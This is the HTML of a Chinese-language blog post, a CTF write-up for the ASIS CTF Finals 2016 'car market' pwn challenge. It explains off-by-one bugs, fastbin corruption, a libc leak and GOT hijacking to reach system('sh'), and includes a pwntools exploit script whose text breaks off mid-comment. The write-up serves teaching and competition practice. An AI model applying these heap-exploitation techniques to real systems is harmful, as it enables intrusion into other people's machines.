@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,heap,ASIS CTF Finals 2016,Use After Free,fastbin,off-by-one," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Info Category: pwnPoint: 177Solver: bruce30262 @ BambooFox再次感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 ddaa 幫忙讀 flag XD  Analyzing64 bit ELF, 有 NX, stack guard, Partial RELRO, 沒 PIE 程式主要有三個選單。一開始進入第一個選單，我們可以 add">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ASIS CTF Finals 2016] car market 177">
+<meta property="og:url" content="https://blog.feedscoin.com/ASIS-CTF-Finals-2016-car-market-177/index.html">
+<meta property="og:site_name" content="逐流小站">
+<meta property="og:description" content="Info Category: pwnPoint: 177Solver: bruce30262 @ BambooFox再次感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 ddaa 幫忙讀 flag XD  Analyzing64 bit ELF, 有 NX, stack guard, Partial RELRO, 沒 PIE 程式主要有三個選單。一開始進入第一個選單，我們可以 add">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2016-09-14T10:16:00.000Z">
+<meta property="article:modified_time" content="2024-01-15T07:55:58.465Z">
+<meta property="article:author" content="Laird Lau">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="ASIS CTF Finals 2016">
+<meta property="article:tag" content="Use After Free">
+<meta property="article:tag" content="fastbin">
+<meta property="article:tag" content="off-by-one">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://blog.feedscoin.com/ASIS-CTF-Finals-2016-car-market-177/"/>
+
+
+
+
+
+  <title>[ASIS CTF Finals 2016] car market 177 | 逐流小站</title>
+  
+
+
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MW47YH6RH0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-MW47YH6RH0');
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">逐流小站</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/ASIS-CTF-Finals-2016-car-market-177/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">[ASIS CTF Finals 2016] car market 177</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-14T18:16:00+08:00">
+                2016-09-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+
+        <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
+<p>Category: pwn<br>Point: 177<br>Solver: bruce30262 @ BambooFox<br>再次感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 ddaa 幫忙讀 flag XD</p>
+</blockquote>
+<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bit ELF, 有 NX, stack guard, Partial RELRO, 沒 PIE</p>
+<p>程式主要有三個選單。一開始進入第一個選單，我們可以 add car, remove car, list car 跟 select car。select car 之後進入第二個選單，可以選擇印出 car 的 info，設定 car 的資訊以及新增一個 customer。新增 customer 時會進入第三個選單，可以設定 customer 的名字和 comment。</p>
+<p>程式主要有兩個 data structure，分別是 <code>car</code> 與 <code>customer</code>，structure 內容如下:</p>
+<figure class="highlight c"><figcaption><span>car</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">car</span>&#123;</span></span><br><span class="line">  <span class="type">char</span> model[<span class="number">16</span>];</span><br><span class="line">  <span class="type">long</span> price;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">customer</span>* <span class="title">customer</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><figcaption><span>customer</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">customer</span>&#123;</span></span><br><span class="line">  <span class="type">char</span> first_name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">char</span>* comment; <span class="comment">// buffer size: 0x48</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>透過一些 reversing 以及 fuzzing，我們可以整理出程式裡面一些較為重要的行為:  </p>
+<ul>
+<li>global data 段會有個 pointer <code>ptr</code>，型態為 <code>struct car**</code>。程式一開始會 malloc 一塊 buffer 給 <code>ptr</code>，之後會拿來存 <code>car*</code> 的 array。  </li>
+<li>在新增一個 <code>car</code> 的 customer 的時候，程式會先檢查 <code>car-&gt;customer</code> 與 <code>car-&gt;customer-&gt;comment</code> 是否存在。如果存在的話會先對這兩塊記憶體做 free，之後重新 malloc 兩塊記憶體給這兩個 data，確保一個 <code>car</code> 裡面只會有一個 customer。  </li>
+<li>程式在處理使用者輸入的時候有存在多個 <strong>off-by-one</strong> 的漏洞。如果在設定 <code>model</code>, <code>first_name</code> 以及 <code>name</code> 的時候，輸入一個較長的字串，我們就有辦法觸發這個漏洞，<strong>造成 structure 中的下一個 data 的第一個 byte 被蓋成 null byte。</strong></li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先我們要有辦法 leak 一些 address。</p>
+<p>首先是 heap 的 address。這部分可以透過以下操作來拿到: </p>
+<ul>
+<li>新增 customer，進入選單三  </li>
+<li>離開選單三</li>
+<li>再進一次選單三</li>
+<li>離開選單三並印出 customer 資訊，此時 <code>customer-&gt;first_name</code> 會是一個 heap 的 address</li>
+</ul>
+<p>會這樣是因為我們在第二次進入選單三的時候，程式會檢查到 <code>car-&gt;customer</code> 與 <code>car-&gt;customer-&gt;comment</code> 的存在，並且會嘗試去 free 這兩塊記憶體。此時 free 完之後，<code>customer</code> 這個 chunk 的 fd (<strong>也就是 <code>customer-&gt;first_name</code> 的位置</strong>) 會被寫成下一個 free chunk 的 address，因此如果這時我們印出 customer 的 first_name，就可以拿到 heap 的 address。</p>
+<p>下一個是 libc 的 address。這部分我們可以利用前面提到的 off-by-one 漏洞，搭配 <strong>fastbin corruption</strong> 的方式來做到。方法如下:</p>
+<p>假設我們有一個 <code>car</code>，它的 <code>customer</code> 的 memory layout 長的像這個樣子:</p>
+<pre>
+             +------------------+
+customer     |........first_name| char first_name[32]
+             |..................|
+             |..................|
+             |..................|
+             +------------------+
+customer+32  |..............name| char name[32]
+             |..................|
+             |..................|
+             |..................|
+             +------------------+
+customer+64  |        0x12345680| char* comment
+             +------------------+ 
+</pre>
+
+<p>此時如果我們再輸入一次 <code>name</code>，並給一個長度超過 32 的字串的話，我們就可以透過 off-by-one 的漏洞，**將 comment 的 pointer 從 <code>0x12345680</code> 改成 <code>0x12345600</code>**。之後程式在 free <code>car-&gt;customer-&gt;comment</code> 的時候，就會 free 到一個錯誤的 chunk。如果我們這時又有一個 <code>car</code>，它的 memory layout 長這樣:</p>
+<pre>
+                      +------------------+
+    car    0x123455F0 |               0x0| char model[16]
+                      +------------------+
+                      |              0x51|
+                      +------------------+
+    car+16 0x12345600 |              0x64| long price
+                      +------------------+
+    car+24 0x12345608 |        0x12348880| struct customer* customer
+                      +------------------+
+</pre>
+
+<p>此時我們可以透過設定 <code>car-&gt;model</code> 來偽造 <code>0x12345600</code> 這塊 memory chunk 的 header，讓程式誤以為它是在 free 一個 size 為 0x50 的 memory chunk (size &#x3D; 0x50，跟 <code>comment</code> 的大小一樣)，並將 <code>0x12345600</code> 這個 memory chunk 加入 fastbin 裡面。 這麼一來我們就製造了一個 <strong>Use-After-Free</strong> 的情形，其中 <code>0x12345600</code> 是我們的 dangling pointer。之後再新增一次 comment 的時候，程式會 malloc <code>0x12345600</code> 來當作是 comment 的 buffer。此時，comment 的 buffer 將會和某個 <code>car</code> 的 structure 重疊，之後我們就可以藉由更改 comment 來修改 <code>car</code> 的 structure。</p>
+<p>可以改 <code>car</code> structure 之後，我們就可以將 <code>car-&gt;customer</code> 這個 pointer 改成 <code>atoi</code> 的 GOT。之後我們就可以藉由印出 <code>car-&gt;customer-&gt;first_name</code> 來 leak <code>atoi</code> 的 GOT，得到 libc 的 address。</p>
+<p>因此整理一下 leak libc address 的方法:</p>
+<ol>
+<li>先新增幾個 <code>car</code>，讓其中一個 <code>car</code> 的 address 是以 <strong>0xf0</strong> 做為結尾 (ex. <code>0x123455f0</code>)，並在 <code>car-&gt;model</code> 裡面放上假的 chunk header</li>
+<li>利用 off-by-one 漏洞更改某個 customer 的 comment 指標 (ex. <code>0x12345680</code> –&gt; <code>0x12345600</code>)</li>
+<li>離開並重新進入選單三，讓程式可以去 free 更改後的 comment 指標</li>
+<li>再新增一個 comment，此時新的 comment buffer 會和其中一個 <code>car</code> structure 重疊，因此我們可以藉由更改 comment 的方式來偽造 <code>car</code> structure，將 <code>car-&gt;customer</code> 改成 <code>atoi</code> 的 GOT</li>
+<li>印出 <code>car-&gt;customer-&gt;first_name</code>，leak <code>atoi</code> 的 GOT，得到 libc 的 address</li>
+</ol>
+<p>拿到 libc 的 address 之後就可以計算 <code>system</code> 的位址 (這題有給 libc.so)。因為這題 GOT 可寫，所以可以嘗試將 <code>atoi</code> 的 GOT 改成 <code>system</code> 之後 hijack <code>atoi</code> 的 GOT。本來一開始我是想用前面的方式來直接改 <code>atoi</code> 的 GOT，因為此時 <code>car-&gt;customer</code> &#x3D; <code>atoi@got.plt</code>，因此我們可以藉由更改 <code>car-&gt;customer-&gt;first_name</code> 的方式來 overwrite GOT 的內容。</p>
+<p>只是嘗試這樣做之後發現程式會 crash。原因是因為要進入選單三更改 first_name 時，程式會先嘗試去 free <code>car-&gt;customer</code>，此時因為這個位置是 <code>atoi</code> 的 GOT，因此 <code>free(atoi@got.plt)</code> 時會炸掉。<strong>此時，文章前面提到的 <code>ptr</code> 變數便派上用場了。</strong></p>
+<p><code>ptr</code> 是一個指向 <code>car*</code> array 的 pointer。因為我們現在可以藉由更改 comment 的方式來控制 <code>car</code> 的 structure，因此如果我們將 <code>car-&gt;customer</code> 改成 <code>ptr</code>，之後程式在 <code>free(car-&gt;customer)</code> 的時候就會去 free <code>ptr</code>，<strong>我們就可以把整個 <code>car*</code> array 給 free 掉</strong>。之後新增 comment 的時候，glibc 會把 <code>ptr</code> 的 chunk 做分割，將其中的 0x50 做為新的 buffer 分配給新的 comment。此時透過更改 comment，我們就可以控制一部分的 <code>car*</code> array。之後將 <code>car</code> 指標改成 <code>atoi</code> 的 GOT，我們就可以藉由更改 <code>car-&gt;model</code> 的方式來覆寫 <code>atoi</code> GOT 的內容，達到 hijack GOT 的效果。</p>
+<p>將上述方法整理一下:</p>
+<ol>
+<li>透過 comment 更改 <code>car</code> 的 structure，將 <code>car-&gt;customer</code> 改成 <code>ptr</code></li>
+<li>離開並重新進入選單三，讓程式可以去 free 更改後的  <code>car-&gt;customer</code></li>
+<li>新增一個 comment，此時新的 comment buffer 會和 <code>car*</code> array 重疊，我們可以藉由更改 comment 的方式來控制 <code>car*</code> array</li>
+<li>將其中一個 car 指標改成 <code>atoi</code> 的 GOT，並藉由更改 <code>car-&gt;model</code> 的方式，將 <code>atoi</code> 的 GOT 改成 <code>system</code> 的 address，做 GOT hijacking</li>
+</ol>
+<p>之後我們在輸入選項時，就可以輸入 <code>sh\x00</code>，執行 <code>system(&#39;sh&#39;)</code> 拿 shell。</p>
+<figure class="highlight python"><figcaption><span>exp_car.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;car-market.asis-ctf.ir&quot;</span></span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./car_market&quot;</span></span><br><span class="line"><span class="comment">#LIBC_PATH = &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;./car_libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_car</span>(<span class="params">model, price</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;model\n&quot;</span>, model)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;price\n&quot;</span>, <span class="built_in">str</span>(price))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sel_car_cust</span>(<span class="params">idx, cust_zip</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (choice, data) <span class="keyword">in</span> cust_zip:</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, data)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust mode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;3&quot;</span>) <span class="comment"># add com</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, <span class="string">&quot;123&quot;</span>) <span class="comment"># input com</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;1&quot;</span>) <span class="comment"># list</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Firstname : &quot;</span>)</span><br><span class="line">    heap_base = u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)) - <span class="number">0xb90</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_got</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Firstname : &quot;</span>)</span><br><span class="line">    atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    log.success(<span class="string">&quot;atoi_addr: &quot;</span>+<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">    libc.address += atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">17</span>):</span><br><span class="line">        model = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)+i)*<span class="number">4</span></span><br><span class="line">        price = <span class="number">100</span>+i</span><br><span class="line">        log.info(<span class="string">&quot;add car: &quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">15</span>: <span class="comment"># fake chunk</span></span><br><span class="line">            model = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">            price = <span class="number">0x1111</span></span><br><span class="line">        add_car(model, price)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap base</span></span><br><span class="line">    log.info(<span class="string">&quot;leaking heap base...&quot;</span>)</span><br><span class="line">    heap_base = leak_heap(<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow one byte of heap address</span></span><br><span class="line">    log.info(<span class="string">&quot;overflowing heap address...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line">    data   = [<span class="string">&quot;comment&quot;</span>, <span class="string">&quot;A&quot;</span>*<span class="number">33</span>]</span><br><span class="line">    sel_car_cust(<span class="number">16</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># add comment and overwrite customer pointer, change it to atoi@got.plt</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car 15 struct (for leaking got)...&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add customer</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;3&quot;</span>) <span class="comment"># add comment</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, p64(<span class="number">0x1111</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit customer menu</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;leaking atoi&#x27;s got &amp; libc base...&quot;</span>)</span><br><span class="line">    leak_got(<span class="number">15</span>)</span><br><span class="line">    system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    log.success(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite customer pointer to heap_base+0x10</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car 15 struct (for corrupting car 